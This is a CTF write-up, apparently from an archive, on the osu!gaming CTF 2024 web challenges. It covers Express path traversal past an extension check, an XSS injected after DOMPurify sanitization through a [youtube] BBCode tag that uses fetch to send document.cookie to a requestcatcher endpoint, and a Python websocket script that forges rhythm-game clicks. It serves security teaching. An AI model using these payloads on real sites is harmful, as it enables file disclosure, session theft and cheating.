---
title: osu!gaming CTF 2024 writeup
contest: osu!gaming
year: 2024
difficulty: hard
vuln_type: file_read
tags:
- express
- purify
- xss-bypass
- youtube-bbcode
- image-lfi
- websocket
- rhythm-game
- bpmspoof
attack_chain:
- /image?path=file.png' LFI 限制 png/jpg
- ?path=foo.png/../../../etc/passwd' 绕
- renderBio purify.sanitize 后 replaceAll [youtube]...[/youtube]
- 净化后再注入 → XSS
- dummy=" onload="fetch(...document.cookie)
- 管理员 admin cookie 截取
- /api/update POST csrf + bio
- websocket 模拟点击伪造 BPM
- /score 高分
key_payload: purify 后处理 + youtube BBCode XSS + BPM 伪造
one_liner: osu!gaming CTF 2024 writeup：Express 路径遍历 + purify 后 XSS + WebSocket BPM 伪造。
lesson: '''purify.sanitize 后再做字符串处理是经典 XSS 绕过模式。'''
quality: high
full_path: osu!gaming_CTF_2024_writeup.full.md
meta_path: osu!gaming_CTF_2024_writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: osu!gaming CTF 2024 writeup。osu!gaming CTF 2024 writeup：Express 路径遍历 + purify 后 XSS + WebSocket BPM 伪造。。关键路径：/image?path=file.png' LFI 限制 png/jpg → ?path=foo.png/../../../etc/passwd' 绕 → renderBio ...
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/165876.html
wp_author: cosMo
reasoning_chain:
- /image?path=file.png 路由按后缀 split('.')[1]==='png' 过滤 → 触发点：扩展名白名单思路，但 path 直接拼 './img/'
- 假设：path 中夹 .png/../ 可绕过后缀白名单 → 动作：构造 path=foo.png/../../../etc/passwd
- 观察：LFI 成功读 /etc/passwd → 下一步：转向 renderBio 的净化处理逻辑
- purify.sanitize 之后做 replaceAll(youtube bbcode) → 触发点：sanitize 之后的字符串处理可二次注入
- 假设：sanitize 完成后 [youtube] 替换后注入 onload 属性 → 动作：bio='[youtube]" onload="fetch(...document.cookie) dummy="[/youtube]'
- 观察：admin 触发 onload → requestcatcher 收到 connect.sid cookie → 下一步：拿 admin cookie
- 得分规则按 round(bpm) 最近排序 + 相同比 UR → 假设：必须伪造 BPM 接近 target → 动作：分析 calculate() 算法
- 假设：clicks 时间戳可控制 → 动作：websocket create_connection('/stream-vs.web.osugaming.lol/') + send_and_recv
- 动作：clicks=[start] + while clicks[-1]+interval<=end append(clicks[-1]+interval) → 观察：bpm 与目标一致 → 完成
failed_attempts:
- 试图直接在 bio 字段写 <img src=x onerror=...> → 失败：purify.sanitize 会清除事件处理器属性
- 试图用 <iframe> → 失败：iframe 在 purify 白名单外被移除
- 试图用单次 payload 偷 cookie → 失败：admin bot 不会重放 history，触发即过期
key_observations:
- sanitize 之后再做字符串拼接/正则替换是经典 XSS 绕过模式（purify 不会感知后续处理）
- Express path 拼接收 filename 时，扩展名白名单只能挡 '".png"' 这种直拼，'foo.png/../../etc/passwd' 绕后扩展名仍合法
- WebSocket 长连接模拟点击是节奏类游戏伪造得分最干净路径（不依赖浏览器注入）
- BBCode [youtube]...[/youtube] 这类标签化容器是 DOM 注入的隐藏入口
prerequisites:
- DOM purify.sanitize 用法与可绕过模式
- Express path traversal 与 Node 文件路径解析
- WebSocket 客户端编程（websocket-client / create_connection）
- DOM XSS 与反射 XSS 区别 + admin bot 触发链
---
# osu!gaming CTF 2024 writeup

> 原文: https://www.ctfiot.com/165876.html
> ID: 165876


```
app.get("/image", (req, res) => {
 if (req.query.path.split(".")[1] === "png" || req.query.path.split(".")[1] === "jpg") { // only allow images
 res.sendFile(path.resolve('./img/' + req.query.path));
 } else {
 res.status(403).send('Access Denied');
 }
});
"raw": "nothing to see here \ud83d\udc40\ud83d\udc40 [color=]the flag is b3N1e29rX3Vfc2VlX21lfQ== encoded with base64]"
const renderBio = (data) => {
 const html = renderBBCode(data);
 const sanitized = purify.sanitize(html);
 // do this after sanitization because otherwise iframe will be removed
 return sanitized.replaceAll(
 /\[youtube\](.+?)\[\/youtube\]/g,
 ''
 );
};
[youtube]" onload="fetch(`https://[yours].requestcatcher.com/get?${document.cookie}`)" dummy="[/youtube]

POST /api/update HTTP/1.1
Host: profile-page.web.osugaming.lol
Content-Length: 189
Content-Type: application/x-www-form-urlencoded
Cookie: csrf=1b979825ce8ef2324cf1c56a9548fd2cbadc7f336dfe70dfe91d691a7e206e3b; connect.sid=s%3A1p3YSt-0ZItsTe-34bLRzqmoiBph99WF.UgL18oVmW2X83tufi0Ao1bXVnoPHbfOaYyEQ6W6349I
csrf: 1b979825ce8ef2324cf1c56a9548fd2cbadc7f336dfe70dfe91d691a7e206e3b
Connection: close

bio=%5byoutube%5d%22%20onload%3d%22fetch(%60https%3a%2f%2f[yours].requestcatcher.com%2fget%3f%24%7bdocument.cookie%7d%60)%22%20dummy%3d%22%5b%2fyoutube%5d
Game ID: qlbc3
 admin
 cookiezi
Song #1 / 3: xi remixed by cosMo@bousouP - FREEDOM DiVE [METAL DIMENSIONS] (211.11 BPM)
 cookiezi - 211.11 BPM | 20.00 UR 🏆
 admin - 0.00 BPM | 0.00 UR
Song #2 / 3: ke-ji. feat Nanahira - Ange du Blanc Pur (182 BPM)
 cookiezi - 182.00 BPM | 20.00 UR 🏆
 admin - 0.00 BPM | 0.00 UR
Song #3 / 3: xi - Blue Zenith (200 BPM)
 cookiezi - 200.00 BPM | 20.00 UR 🏆
 admin - 0.00 BPM | 0.00 UR
Better luck next time!
// scoring algorithm
// first judge by whoever has round(bpm) closest to target bpm, if there is a tie, judge by lower UR
/*
session.results[session.round] = session.results[session.round].sort((a, b) => {
 const bpmDeltaA = Math.abs(Math.round(a.bpm) - session.songs[session.round].bpm);
 const bpmDeltaB = Math.abs(Math.round(b.bpm) - session.songs[session.round].bpm);
 if (bpmDeltaA !== bpmDeltaB) return bpmDeltaA - bpmDeltaB;
 return a.ur - b.ur
});
*/
{"type":"results","data":{"clicks":[],"start":
1709344913209,"end":
1709344922274}}
// algorithm from https://ckrisirkc.github.io/osuStreamSpeed.js/newmain.js
const calculate = (start, end, clicks) => {
 const clickArr = [...clicks];
 const bpm = Math.round(((clickArr.length / (end - start) * 60000)/4) * 100) / 100;
 const deltas = [];
 for (let i = 0; i < clickArr.length - 1; i++) {
 deltas.push(clickArr[i + 1] - clickArr[i]);
 }
 const deltaAvg = deltas.reduce((a, b) => a + b, 0) / deltas.length;
 const variance = deltas.map(v => (v - deltaAvg) * (v - deltaAvg)).reduce((a, b) => a + b, 0);
 const stdev = Math.sqrt(variance / deltas.length);

 return { bpm: bpm || 0, ur: stdev * 10 || 0};
};
from websocket import create_connection
import json
from decimal import *
import time
ws = create_connection("wss://stream-vs.web.osugaming.lol/")

def send_and_recv(payload):
 ws.send(json.dumps(payload))
 return json.loads(ws.recv())

send_and_recv({"type":"login","data":"evilman"})
send_and_recv({"type":"challenge"})
songs = send_and_recv({"type":"start"})['data']['songs']
for song in songs:
 start = int(time.time())
 end = start + song['duration'] * 1000
 interval = 60000 / song['bpm'] / 4
 clicks = [start]
 while clicks[-1] + interval <= end:
 clicks.append(clicks[-1] + interval)

 p = {"type":"results","data":{"clicks":
clicks,"start":
start, "end":
end}}
 #print(p)
 send_and_recv(p) # results
 print(ws.recv()) # game or message

 time.sleep(song['duration'])
```
